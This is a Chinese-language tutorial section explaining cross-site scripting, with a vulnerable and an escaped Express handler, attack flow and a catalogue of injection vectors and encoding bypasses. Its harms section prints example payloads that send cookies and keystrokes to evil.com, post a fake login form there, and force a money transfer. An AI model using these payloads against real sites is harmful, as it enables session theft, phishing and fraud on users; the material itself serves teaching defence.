📚 XSS 攻击概述

XSS (Cross-Site Scripting) 是一种代码注入攻击，攻击者将恶意脚本注入到网页中，在其他用户浏览时执行。

# XSS 攻击定义 攻击者利用网页漏洞，将恶意脚本注入到页面中 当其他用户访问该页面时，脚本在其浏览器中执行 # 为什么叫 XSS 原本应该叫 CSS (Cross-Site Scripting) 但与 Cascading Style Sheets 冲突 所以改为 XSS # XSS 攻击流程 1. 攻击者发现输入输出漏洞 2. 构造恶意脚本注入 3. 脚本被存储或反射到页面 4. 受害者访问包含脚本的页面 5. 脚本在受害者浏览器执行 6. 攻击者窃取数据或执行操作 # XSS 攻击条件 1. 网页存在输入输出漏洞 2. 用户输入未经处理直接输出 3. 攻击者能够构造恶意输入 4. 用户访问包含恶意脚本的页面

🔧 攻击示例分析

# 场景：搜索功能反射用户输入 ## 正常请求 GET /search?q=hello Response: <div>搜索结果: hello</div> ## XSS 攻击请求 GET /search?q=<script>alert('XSS')</script> Response: <div>搜索结果: <script>alert('XSS')</script></div> # 服务端代码漏洞 // 不安全的代码 app.get('/search', (req, res) => { const query = req.query.q; res.send(`<div>搜索结果: ${query}</div>`); }); // 安全的代码 import escapeHtml from 'escape-html'; app.get('/search', (req, res) => { const query = req.query.q; res.send(`<div>搜索结果: ${escapeHtml(query)}</div>`); }); # 常见注入点 1. URL 参数 2. 表单输入 3. URL 路径 4. HTTP 头 5. Cookie 6. 文件上传

⚙️ XSS 攻击危害

# 1. 窃取 Cookie 和 Session <script> fetch('https://evil.com/steal?cookie=' + document.cookie); </script> # 2. 劫持用户操作 <script> // 发起转账请求 fetch('/api/transfer', { method: 'POST', body: JSON.stringify({ to: 'hacker', amount: 10000 }), credentials: 'include', }); </script> # 3. 篡改页面内容 <script> document.body.innerHTML = '<h1>网站已被攻击</h1>'; </script> # 4. 键盘记录 <script> document.addEventListener('keydown', (e) => { fetch('https://evil.com/log?key=' + e.key); }); </script> # 5. 钓鱼攻击 <script> document.body.innerHTML = ` <form action="https://evil.com/phish"> <input name="username" placeholder="用户名"> <input name="password" type="password" placeholder="密码"> <button>登录</button> </form> `; </script> # 6. 蠕虫传播 <script> // 在社交网站发送包含恶意脚本的消息 // 形成蠕虫式传播 </script>

🚀 攻击向量多样性

# 多种 XSS 注入方式 ## 标签注入 <script>alert(1)</script> ## 事件处理器 <img src=x onerror="alert(1)"> <svg onload="alert(1)"> <body onload="alert(1)"> ## JavaScript 伪协议 <a href="javascript:alert(1)">click</a> ## 数据绑定 <div data-value="<script>alert(1)</script>"></div> ## HTML 属性 <input value="" onfocus="alert(1)" autofocus> ## SVG <svg><script>alert(1)</script></svg> ## Math <math><mtext><script>alert(1)</script></mtext></math> ## 模板注入 {{constructor.constructor('alert(1)')()}} # 编码绕过 # HTML 实体编码 <script>alert(1)</script> # URL 编码 %3Cscript%3Ealert(1)%3C/script%3E # Unicode 编码 \u003cscript\u003ealert(1)\u003c/script\u003e

📝 本节小结

✅
  • • XSS 是将恶意脚本注入网页的攻击
  • • 危害包括窃取 Cookie、劫持操作、篡改页面
  • • 攻击向量多种多样，不限于 script 标签
  • • 防护需要多层次的编码和过滤
